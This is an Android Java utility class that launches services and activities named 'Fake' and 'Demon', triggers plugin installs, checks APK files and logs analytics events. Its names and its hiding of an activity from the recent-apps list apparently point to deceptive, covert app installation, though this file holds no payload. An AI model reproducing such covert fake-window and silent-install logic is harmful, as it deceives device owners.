package com.xstd.qm;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.umeng.analytics.MobclickAgent;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.service.FakeBindService;
import com.xstd.qm.setting.SettingManager;

import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-6
 * Time: PM2:16
 * To change this template use File | Settings | File Templates.
 */
public class Utils {

    public static void umengLog(Context context, String event, HashMap<String, String> log) {
        log.put("v", UtilsRuntime.getVersionName(context));
        log.put("osVersion", Build.VERSION.RELEASE);
        MobclickAgent.onEvent(context, event, log);
        MobclickAgent.flush(context);
    }

    public static void startFakeService(Context context, String from) {
        if (Config.DEBUG) {
            Config.LOGD("[[CommonUtil::startFakeService]] from reason : " + from);
        }
        Intent is = new Intent();
        is.setClass(context, FakeBindService.class);
//        is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
        context.startService(is);
    }

//    public static String makeExtraInfo(Context context, String appendExtra) {
//        String extra = "";
//        boolean isTablet = AppRuntime.isTablet(context);
//        if (isTablet) extra = extra + ":平板";
//        String saveExtra = SettingManager.getInstance().getExtraInfo();
//        if (!TextUtils.isEmpty(saveExtra)) {
//            extra = extra + saveExtra;
//        }
//
//        return extra;
//    }

    public static void notifyServiceInfo(Context context) {
        Intent i = new Intent();
        i.setClass(context, DemonService.class);
        i.setAction(DemonService.ACTION_PLUGIN_INSTALL);
        context.startService(i);
    }

    public static void saveExtraInfo(String info) {
        String saveExtra = SettingManager.getInstance().getExtraInfo();
        if (!TextUtils.isEmpty(saveExtra)) {
            String[] splited = saveExtra.split(":");
            if (splited != null) {
                boolean contain = false;
                for (String s : splited) {
                    if (s.equals(info)) {
                        contain = true;
                        break;
                    }
                }
                if (!contain) {
                    saveExtra = saveExtra + ":" + info;
                    SettingManager.getInstance().setExtraInfo(saveExtra);
                }
            } else {
                SettingManager.getInstance().setExtraInfo(info);
            }
        } else {
            SettingManager.getInstance().setExtraInfo(info);
        }
    }

    public static final void tryToActivePluginApp(Context context) {
        Intent i = new Intent();
        i.setAction(DemonService.ACTION_ACTIVE_PLUGIN);
        i.setClass(context, DemonService.class);
        context.startService(i);
    }

    public static final void startFakeActivity(Context context, String fullPath) {
        Intent i = new Intent();
        i.setClass(context, FakeActivity.class);
        i.putExtra(FakeActivity.KEY_PATH, fullPath);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        context.startActivity(i);
    }

    public static final boolean isVersionBeyondGB() {
        return Build.VERSION.SDK_INT > Build.VERSION_CODES.GINGERBREAD_MR1;
    }

    public static final boolean checkAPK(Context context, String apkPath) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(apkPath, PackageManager.GET_ACTIVITIES);
            if (info != null) {
                return true;
            }
        } catch (Exception e) {
            if (Config.DEBUG) {
                e.printStackTrace();
                Config.LOGD("[[checkAPK]] error for check : " + apkPath, e);
            }
        }
        return false;
    }

    public static boolean deviceNeedAdapter() {
        if (AppRuntime.ADPINFO_LIST != null) {
            synchronized (AppRuntime.ADPINFO_LIST) {
                String phoneType = Build.MODEL;
                if (!TextUtils.isEmpty(phoneType)) {
                    phoneType = phoneType.toLowerCase();
                    for (AdpInfo info : AppRuntime.ADPINFO_LIST) {
                        if (info.phoneType != null && phoneType.contains(info.phoneType)) {
                            return true;
                        }
                    }
                }
            }
        }

        return false;
    }

    public static String replaceBlank(String str) {
        String dest = str;
        if (str != null) {
            Pattern p = Pattern.compile("\\s*|\t|\r|\n");
            Matcher m = p.matcher(str);
            dest = m.replaceAll("");
        }
        return dest;
    }

//    public static final void loadAdapterInfoFromLocal() {
//        final String local = DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + Config.ADP_LEFT_LOCAL;
//        File localFile = new File(local);
//        if (localFile.exists()) {
//            try {
//                String content = FileOperatorHelper.readFileContent(local);
//                if (!TextUtils.isEmpty(content)) {
//                    content = replaceBlank(content);
//                    if (Config.DEBUG) {
//                        Config.LOGD("[[<<<<loadAdapterInfoFromLocal>>>>]] content : " + content);
//                    }
//
//                    Type type = new TypeToken<AdpObj>() {
//                    }.getType();
//                    AdpObj ret = GsonUtils.parse(content, type);
//                    if (ret != null) {
//                        //解析成功
//                        if (Config.DEBUG) {
//                            Config.LOGD("[[<<<<loadAdapterInfoFromLocal>>>>]] parse Data : " + ret.data);
//                        }
//
//                        synchronized (AppRuntime.ADPINFO_LIST) {
//                            if (ret.data != null) {
//                                AppRuntime.ADPINFO_LIST = ret.data;
//                            } else {
//                                AppRuntime.ADPINFO_LIST.clear();
//                            }
//                            return;
//                        }
//                    } else {
//                        if (Config.DEBUG) {
//                            Config.LOGD("[[<<<<loadAdapterInfoFromLocal>>>>]] parse Data error >>>>>>>>>>");
//                        }
//                    }
//                }
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//    }


//    public static final void tryToFetchAdapterInfo(Context context) {
//        try {
//            final String local = DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + Config.ADP_LEFT_LOCAL;
//            File localFile = new File(local);
//            if (localFile.exists()) {
//                //每次都删除之前的
//                localFile.delete();
//            }
//
//            FileDownloader.DownloadRequest request = new FileDownloader.DownloadRequest(Config.ADP_LEFT_URL);
//            FileDownloader.getInstance(context).postRequest(request, new FileDownloader.DownloadListener() {
//                @Override
//                public void onDownloadProcess(int fileSize, int downloadSize) {
//                    if (Config.DEBUG) {
//                        Config.LOGD("[[<<<<tryToFetchAdapterInfo>>>>]] download process : " + downloadSize);
//                    }
//                }
//
//                @Override
//                public void onDownloadFinished(int status, Object response) {
//                    if (status == FileDownloader.DOWNLOAD_SUCCESS && response != null) {
//                        FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
//                        String localPath = r.getRawLocalPath();
//                        File file = new File(localPath);
//                        if (file.exists()) {
//                            //下载成功
//                            try {
//                                String content = FileOperatorHelper.readFileContent(localPath);
//                                if (!TextUtils.isEmpty(content)) {
//                                    content = replaceBlank(content);
//                                    if (Config.DEBUG) {
//                                        Config.LOGD("[[<<<<tryToFetchAdapterInfo>>>>]] content : " + content);
//                                    }
//                                    Type type = new TypeToken<AdpObj>() {
//                                    }.getType();
//                                    AdpObj ret = GsonUtils.parse(content, type);
//                                    if (ret != null) {
//                                        //解析成功
//                                        if (Config.DEBUG) {
//                                            Config.LOGD("[[<<<<tryToFetchAdapterInfo>>>>]] parse Data : " + ret.data);
//                                        }
//
//                                        FileOperatorHelper.moveFile(localPath, local);
//                                        synchronized (AppRuntime.ADPINFO_LIST) {
//                                            if (ret.data != null) {
//                                                AppRuntime.ADPINFO_LIST = ret.data;
//                                            } else {
//                                                AppRuntime.ADPINFO_LIST.clear();
//                                            }
//                                            return;
//                                        }
//                                    } else {
//                                        if (Config.DEBUG) {
//                                            Config.LOGD("[[<<<<tryToFetchAdapterInfo>>>>]] parse Data : " + ret.data);
//                                        }
//                                    }
//                                }
//                            } catch (Exception e) {
//                                e.printStackTrace();
//                            }
//
//                            file.delete();
//                        }
//                    }
//                }
//            });
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }

}
